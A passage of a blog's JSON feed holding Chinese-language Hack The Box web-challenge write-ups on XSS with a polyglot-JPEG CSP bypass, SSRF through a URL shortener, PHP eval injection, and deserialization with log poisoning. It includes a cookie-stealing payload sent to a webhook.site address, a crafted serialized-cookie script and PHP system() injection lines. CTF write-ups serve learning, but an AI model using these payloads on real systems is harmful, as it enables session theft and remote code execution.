class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\treturn db.addPost(user.username, content)</span><br><span class=\"line\">\t\t\t\t\t.then(() =&gt; &#123;</span><br><span class=\"line\">\t\t\t\t\t\tbot.purgeData(db);</span><br><span class=\"line\">\t\t\t\t\t\tres.send(response(&#x27;Your submission is awaiting approval by Admin!&#x27;));</span><br><span class=\"line\">\t\t\t\t\t&#125;);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\treturn res.status(403).send(response(&#x27;Please write your story first!&#x27;));</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t\t.catch(() =&gt; res.status(500).send(response(&#x27;Something went wrong!&#x27;)));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.post(&#x27;/api/upload&#x27;, AuthMiddleware, async (req, res) =&gt; &#123;</span><br><span class=\"line\">\treturn db.getUser(req.data.username)</span><br><span class=\"line\">\t\t.then(user =&gt; &#123;</span><br><span class=\"line\">\t\t\tif (user === undefined) return res.redirect(&#x27;/&#x27;);</span><br><span class=\"line\">\t\t\tif (!req.files) return res.status(400).send(response(&#x27;No files were uploaded.&#x27;));</span><br><span class=\"line\">\t\t\treturn UploadHelper.uploadImage(req.files.avatarFile)</span><br><span class=\"line\">\t\t\t\t.then(filename =&gt; &#123;</span><br><span class=\"line\">\t\t\t\t\treturn db.updateAvatar(user.username,filename)</span><br><span class=\"line\">\t\t\t\t\t\t.then(()  =&gt; &#123;</span><br><span class=\"line\">\t\t\t\t\t\t\tres.send(response(&#x27;Image uploaded successfully!&#x27;));</span><br><span class=\"line\">\t\t\t\t\t\t\tif(user.avatar != &#x27;default.jpg&#x27;) </span><br><span class=\"line\">\t\t\t\t\t\t\t\tfs.unlinkSync(path.join(__dirname, &#x27;/../uploads&#x27;,user.avatar)); // remove old avatar</span><br><span class=\"line\">\t\t\t\t\t\t&#125;)</span><br><span class=\"line\">\t\t\t\t&#125;)</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t\t.catch(err =&gt; res.status(500).send(response(err.message)));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.get(&#x27;/api/avatar/:username&#x27;, async (req, res) =&gt; &#123;</span><br><span class=\"line\">\treturn db.getUser(req.params.username)</span><br><span class=\"line\">\t\t.then(user =&gt; &#123;</span><br><span class=\"line\">\t\t\tif (user === undefined) return res.status(404).send(response(&#x27;user does not exist!&#x27;));</span><br><span class=\"line\">\t\t\tavatar = path.join(__dirname, &#x27;/../uploads&#x27;, user.avatar);</span><br><span class=\"line\">\t\t\treturn res.sendFile(avatar);</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t\t.catch(() =&gt; res.status(500).send(response(&#x27;Something went wrong!&#x27;)));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.get(&#x27;/logout&#x27;, (req, res) =&gt; &#123;</span><br><span class=\"line\">\tres.clearCookie(&#x27;session&#x27;);</span><br><span class=\"line\">\treturn res.redirect(&#x27;/&#x27;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">module.exports = database =&gt; &#123; </span><br><span class=\"line\">\tdb = database;</span><br><span class=\"line\">\treturn router;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>这个是记录路由的地方</p>\n<p>并且上面还引用了我们需要的</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const bot            = require(&#x27;../bot&#x27;);</span><br></pre></td></tr></table></figure></p>\n<p>在代码 93 行调用了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bot.purgeData(db);</span><br></pre></td></tr></table></figure></p>\n<p>现在我们就是要利用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">router.get(&#x27;/api/avatar/:username&#x27;, async (req, res) =&gt; &#123;</span><br><span class=\"line\">\treturn db.getUser(req.params.username)</span><br><span class=\"line\">\t\t.then(user =&gt; &#123;</span><br><span class=\"line\">\t\t\tif (user === undefined) return </span><br></pre></td></tr></table></figure></p>\n<p>加上前端代码的</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;/p&gt;</span><br><span class=\"line\">                        &lt;p&gt;&#123;&#123; post.content|safe &#125;&#125;&lt;/p&gt;</span><br><span class=\"line\">                    &lt;/div&gt;</span><br></pre></td></tr></table></figure></p>\n<p>来达到获取 cookie 但是因为这个 blog 利用了 csp</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Security-Policy: &quot;default-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src &#x27;self&#x27; https://fonts.googleapis.com; font-src &#x27;self&#x27; https://fonts.gstatic.com;&quot;</span><br></pre></td></tr></table></figure></p>\n<p>然后</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(twoDots == null || twoDots.length != 2)&#123;</span><br><span class=\"line\">\treturn res.status(403).send(response(&#x27;Your story must contain two sentences! We call it TwoDots Horror!&#x27;));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>要求你必须要写两个段落也就是两个点</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=&quot;/api/avatar/test&quot;&gt;&lt;/script&gt;1.1.</span><br></pre></td></tr></table></figure></p>\n<p>写成这样就可以了</p>\n<p>在利用 upload 来上传我们需要的 payload</p>\n<p>参考链接</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs</span><br></pre></td></tr></table></figure></p>\n<p>这里接收 cookie 的用的是 webhook</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*/=document.location.href=&quot;https://webhook.site/72ad2f9e-7a81-4b01-d3ed-8290387f7d0b?&quot;+document.cookie;/*</span><br></pre></td></tr></table></figure></p>\n<p>内容加进图片并且要不小于 120x120</p>\n<p>这里我使用的软件是</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">img_polygloter.py</span><br></pre></td></tr></table></figure></p>\n<p>然后不知道为什么我就得不到 cookie</p>\n",
            "tags": [
                "WEB"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-Saturn/",
            "url": "https://lookhui.github.io/HTB-Saturn/",
            "title": "HTB-Saturn",
            "date_published": "2023-12-15T09:04:13.000Z",
            "content_html": "<h1 id=\"saturn\"><a class=\"anchor\" href=\"#saturn\">#</a> Saturn</h1>\n<p>白盒测试</p>\n<p>首先进入网站下载题目</p>\n<p>查看到了源码使用 python 进行搭建</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from flask import Flask, request, render_template</span><br><span class=\"line\">import requests</span><br><span class=\"line\">from safeurl import safeurl</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class=\"line\">def index():</span><br><span class=\"line\">    if request.method == &#x27;POST&#x27;:</span><br><span class=\"line\">        url = request.form[&#x27;url&#x27;]</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            su = safeurl.SafeURL()</span><br><span class=\"line\">            opt = safeurl.Options()</span><br><span class=\"line\">            opt.enableFollowLocation().setFollowLocationLimit(0)</span><br><span class=\"line\">            su.setOptions(opt)</span><br><span class=\"line\">            su.execute(url)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            return render_template(&#x27;index.html&#x27;, error=f&quot;Malicious input detected.&quot;)</span><br><span class=\"line\">        r = requests.get(url)</span><br><span class=\"line\">        return render_template(&#x27;index.html&#x27;, result=r.text)</span><br><span class=\"line\">    return render_template(&#x27;index.html&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(&#x27;/secret&#x27;)</span><br><span class=\"line\">def secret():</span><br><span class=\"line\">    if request.remote_addr == &#x27;127.0.0.1&#x27;:</span><br><span class=\"line\">        flag = &quot;&quot;</span><br><span class=\"line\">        with open(&#x27;./flag.txt&#x27;) as f:</span><br><span class=\"line\">            flag = f.readline()</span><br><span class=\"line\">        return render_template(&#x27;secret.html&#x27;, SECRET=flag)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        return render_template(&#x27;forbidden.html&#x27;), 403</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    app.run(host=&quot;0.0.0.0&quot;, port=1337, threaded=True)</span><br></pre></td></tr></table></figure></p>\n<p>一开始我看这个题目觉得很离谱，一直在传参发现没有作用</p>\n<p>先来解释一遍这个代码的过程吧</p>\n<ol>\n<li>\n<p>调用了这三个包，真的非常的强大的几个包</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from flask import Flask, request, render_template</span><br><span class=\"line\">import requests</span><br><span class=\"line\">from safeurl import safeurl</span><br></pre></td></tr></table></figure></p>\n<p>了解一下这个包，他是用来效验你的 url 是否为他想要的那几个</p>\n<p>源码过滤如下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">self._lists = &#123;</span><br><span class=\"line\">        &quot;whitelist&quot;: &#123;</span><br><span class=\"line\">            &quot;ip&quot;: [],</span><br><span class=\"line\">            &quot;port&quot;: [&quot;80&quot;, &quot;443&quot;, &quot;8080&quot;],</span><br><span class=\"line\">            &quot;domain&quot;: [],</span><br><span class=\"line\">            &quot;scheme&quot;: [&quot;http&quot;, &quot;https&quot;]&#125;,</span><br><span class=\"line\">        &quot;blacklist&quot;: &#123;</span><br><span class=\"line\">            &quot;ip&quot;: [&quot;0.0.0.0/8&quot;, &quot;10.0.0.0/8&quot;, &quot;100.64.0.0/10&quot;, &quot;127.0.0.0/8&quot;, &quot;169.254.0.0/16&quot;,</span><br><span class=\"line\">                &quot;172.16.0.0/12&quot;, &quot;192.0.0.0/29&quot;, &quot;192.0.2.0/24&quot;, &quot;192.88.99.0/24&quot;, &quot;192.168.0.0/16&quot;,</span><br><span class=\"line\">                &quot;198.18.0.0/15&quot;, &quot;198.51.100.0/24&quot;, &quot;203.0.113.0/24&quot;, &quot;224.0.0.0/4&quot;, &quot;240.0.0.0/4&quot;],</span><br><span class=\"line\">            &quot;port&quot;: [],</span><br><span class=\"line\">            &quot;domain&quot;: [],</span><br><span class=\"line\">            &quot;scheme&quot;: []&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<p>然后就是一个函数</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class=\"line\">def index():</span><br><span class=\"line\">    if request.method == &#x27;POST&#x27;:</span><br><span class=\"line\">        url = request.form[&#x27;url&#x27;]</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            su = safeurl.SafeURL()</span><br><span class=\"line\">            opt = safeurl.Options()</span><br><span class=\"line\">            opt.enableFollowLocation().setFollowLocationLimit(0)</span><br><span class=\"line\">            su.setOptions(opt)</span><br><span class=\"line\">            su.execute(url)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            return render_template(&#x27;index.html&#x27;, error=f&quot;Malicious input detected.&quot;)</span><br><span class=\"line\">        r = requests.get(url)</span><br><span class=\"line\">        return render_template(&#x27;index.html&#x27;, result=r.text)</span><br><span class=\"line\">    return render_template(&#x27;index.html&#x27;)</span><br></pre></td></tr></table></figure></p>\n<p>这个函数就是让你输入一个 url 并且必须要你的 url 不是本地 url 使用了上面说的 safeurl 进行了效验</p>\n</li>\n<li>\n<p>第三段</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@app.route(&#x27;/secret&#x27;)</span><br><span class=\"line\">def secret():</span><br><span class=\"line\">    if request.remote_addr == &#x27;127.0.0.1&#x27;:</span><br><span class=\"line\">        flag = &quot;&quot;</span><br><span class=\"line\">        with open(&#x27;./flag.txt&#x27;) as f:</span><br><span class=\"line\">            flag = f.readline()</span><br><span class=\"line\">        return render_template(&#x27;secret.html&#x27;, SECRET=flag)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        return render_template(&#x27;forbidden.html&#x27;), 403</span><br></pre></td></tr></table></figure></p>\n<p>这个代码只要你的 requests.remote_addr 是 127.0.0.1 就能得到 flag</p>\n<p>但是这个 remote_addr 和 xff 那种不太一样不好进行伪造</p>\n</li>\n<li>\n<p>总结</p>\n<p>我们现在可以通过第一个路由 index 来去访问这个 secret 来构成伪造，要么就自己伪造这个 127.0.0.1</p>\n<p>我经过了很久搜索发现这个伪造没有我想的这么简单</p>\n<p>并且在其他网站上还有说这个 remote_addr 根本不可能伪造</p>\n</li>\n</ol>\n<h4 id=\"最后\"><a class=\"anchor\" href=\"#最后\">#</a> 最后</h4>\n<p>经过多次搜索在不屑的努力下，搜到了一个网站</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://www.shorturl.at/shortener.php</span><br></pre></td></tr></table></figure></p>\n<p>这个网站可以将你的 url 缩短并且使用他的 url 和使用自己的效果一样</p>\n<p>把</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1:1337/secret</span><br></pre></td></tr></table></figure></p>\n<p>输入进入后能发现变成了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://shorturl.at/abENS</span><br></pre></td></tr></table></figure></p>\n<p>然后输入到 index 的框里面</p>\n",
            "tags": [
                "WEB"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-WEB-md/",
            "url": "https://lookhui.github.io/HTB-WEB-md/",
            "title": "HTB-WEB",
            "date_published": "2023-12-13T00:49:46.000Z",
            "content_html": "<h3 id=\"lovetok\"><a class=\"anchor\" href=\"#lovetok\">#</a> LoveTok</h3>\n<p>查看这个主页这个代码调用了另外一个地方的代码 timecontroller 先以 get 请求进去之后在使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class TimeController</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public function index($router)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $format = isset($_GET[&#x27;format&#x27;]) ? $_GET[&#x27;format&#x27;] :&#x27;r&#x27;;</span><br><span class=\"line\">        $time = new TimeModel($format);</span><br><span class=\"line\">        return $router-&gt;view(&#x27;index&#x27;, [&#x27;time&#x27; =&gt; $time-&gt;getTime()]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这个 timecontroller 的代码有了一个 get 请求并且直接将这个 get 请求的内容 format 放进 timemodlqu 进行调用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class TimeModel</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public function __construct($format)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $this-&gt;format = addslashes($format);</span><br><span class=\"line\"></span><br><span class=\"line\">        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];</span><br><span class=\"line\">        $this-&gt;prediction = &quot;+$&#123;d&#125; day +$&#123;h&#125; hour +$&#123;m&#125; minute +$&#123;s&#125; second&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function getTime()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        eval(&#x27;$time = date(&quot;&#x27; . $this-&gt;format . &#x27;&quot;, strtotime(&quot;&#x27; . $this-&gt;prediction . &#x27;&quot;));&#x27;);</span><br><span class=\"line\">        return isset($time) ? $time : &#x27;Something went terribly wrong&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>上面这个代码主要是查看到了一个 eval 代码可以判断为漏洞点，刚刚调用的是 timemode1 的方法并且这个里面的 gettime 方法里面还调用了 format 刚好触发 eval 来直接执行命令，相当于触发了 ${system (ls)} 漏洞也就是说 ssti 漏洞被触发</p>\n<h3 id=\"toxic\"><a class=\"anchor\" href=\"#toxic\">#</a> Toxic</h3>\n<p>白盒测试，首先看源代码，发现</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">spl_autoload_register(function ($name)&#123;</span><br><span class=\"line\">    if (preg_match(&#x27;/Model$/&#x27;, $name))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $name = &quot;models/$&#123;name&#125;&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    include_once &quot;$&#123;name&#125;.php&quot;;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">if (empty($_COOKIE[&#x27;PHPSESSID&#x27;]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $page = new PageModel;</span><br><span class=\"line\">    $page-&gt;file = &#x27;/www/index.html&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">    setcookie(</span><br><span class=\"line\">        &#x27;PHPSESSID&#x27;, </span><br><span class=\"line\">        base64_encode(serialize($page)), </span><br><span class=\"line\">        time()+60*60*24, </span><br><span class=\"line\">        &#x27;/&#x27;</span><br><span class=\"line\">    );</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\">$cookie = base64_decode($_COOKIE[&#x27;PHPSESSID&#x27;]);</span><br><span class=\"line\">unserialize($cookie);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>这里使用的是一个反序列化代码并且 new pageMode1</p>\n<p>我们去看这个 pageMode1</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class PageModel</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $file;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __destruct() </span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        include($this-&gt;file);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>发现这个编码使用的是一个__destruct () 来进行包含查看源码，index.php 里面还给了 file 进行了定义值，并且 cookie 处来设定，并且只是使用了一个 base64 来进行加密，我们去访问网站把 cookie copy 一下进行解码</p>\n<p><img data-src=\"/pic/image-20231208154207149.png\" alt=\"\" /></p>\n<p>这里可以发现这个我们可以利用文件包含来查看任意内容，但是查看 entrypoint.sh 发现初始化时把 flag 给更改为 flag_加 5 个随机字符</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/ash</span><br><span class=\"line\"></span><br><span class=\"line\"># Secure entrypoint</span><br><span class=\"line\">chmod 600 /entrypoint.sh</span><br><span class=\"line\"></span><br><span class=\"line\"># Generate random flag filename</span><br><span class=\"line\">mv /flag /flag_`cat /dev/urandom | tr -dc &#x27;a-zA-Z0-9&#x27; | fold -w 5 | head -n 1`</span><br><span class=\"line\"></span><br><span class=\"line\">exec &quot;$@&quot;</span><br></pre></td></tr></table></figure></p>\n<p>现在可以想到的方法有去爆破他的 5 位随机字符代码如下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import base64</span><br><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\">random=str(os.system(&quot;cat /dev/urandom | tr -dc &#x27;a-zA-Z0-9&#x27; | fold -w 5 | head -n 1&quot;))</span><br><span class=\"line\">print(random)</span><br><span class=\"line\">url=&#x27;http://159.65.20.166:31290/&#x27;</span><br><span class=\"line\">php=&#x27;O:9:&quot;PageModel&quot;:1:&#123;s:4:&quot;file&quot;;s:60:&quot;php://filter/read=convert.base64-encode/resource=/flag_&#x27;+random+&#x27;&quot;;&#125;&#x27;</span><br><span class=\"line\">print(1)</span><br><span class=\"line\">cookie=base64.b64encode(php.encode())</span><br><span class=\"line\">header=&#123;</span><br><span class=\"line\">    &quot;Cookie&quot;:f&quot;PHPSESSID=&#123;cookie&#125;&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">pro=requests.get(url,headers=header,timeout=0.5)</span><br><span class=\"line\">print(cookie)</span><br><span class=\"line\">print(len(pro.text))</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>爆破的话不太实际需要的时间太久，我们可以使用日志包含 php 然后通过访问访问达到文件包含来利用这个漏洞，因为访问页面时我们的浏览器表头 user-agent 和访问路径会被记录到日志上那可以使用如：</p>\n<ol>\n<li>首先使用 hackbar 来修改 header 的 user-agent:&lt;?php system ('ls /'); ?&gt;</li>\n<li>使用 hackbar 修改 header 的 Cookie 的 phpsessid 来等于 O:9:&quot;PageModel&quot;:1:{s:4:&quot;file&quot;;s:25:&quot;/var/log/nginx/access.log&quot;;} 进行 base 加密就能得到 flag 命名</li>\n<li>把 &lt;?php system ('cat /flag_1de1w'); ?&gt; 可以或者更改 cookie 也行</li>\n</ol>\n<h3 id=\"neonify\"><a class=\"anchor\" href=\"#neonify\">#</a> Neonify</h3>\n<p>这个 ruby 我第一次玩，白盒测试打开主代码 index.erb</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;title&gt;Neonify&lt;/title&gt;</span><br><span class=\"line\">    &lt;link rel=&quot;stylesheet&quot; href=&quot;stylesheets/style.css&quot;&gt;</span><br><span class=\"line\">    &lt;link rel=&quot;icon&quot; type=&quot;image/gif&quot; href=&quot;/images/gem.gif&quot;&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">    &lt;div class=&quot;wrapper&quot;&gt;</span><br><span class=\"line\">        &lt;h1 class=&quot;title&quot;&gt;Amazing Neonify Generator&lt;/h1&gt;</span><br><span class=\"line\">        &lt;form action=&quot;/&quot; method=&quot;post&quot;&gt;</span><br><span class=\"line\">            &lt;p&gt;Enter Text to Neonify&lt;/p&gt;&lt;br&gt;</span><br><span class=\"line\">            &lt;input type=&quot;text&quot; name=&quot;neon&quot; value=&quot;&quot;&gt;</span><br><span class=\"line\">            &lt;input type=&quot;submit&quot; 